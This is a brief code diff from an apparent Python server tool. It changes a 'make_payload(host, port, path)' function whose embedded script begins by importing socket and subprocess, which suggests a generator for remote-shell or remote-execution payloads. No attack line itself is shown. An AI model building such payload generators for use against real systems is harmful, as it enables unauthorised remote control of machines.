@@ -175,7 +175,7 @@ class Server:
 
 
 def make_payload(host, port, path):
-    payload_code = f"""
+    payload_code = """
 #!/usr/bin/env python3
 import socket
 import subprocess
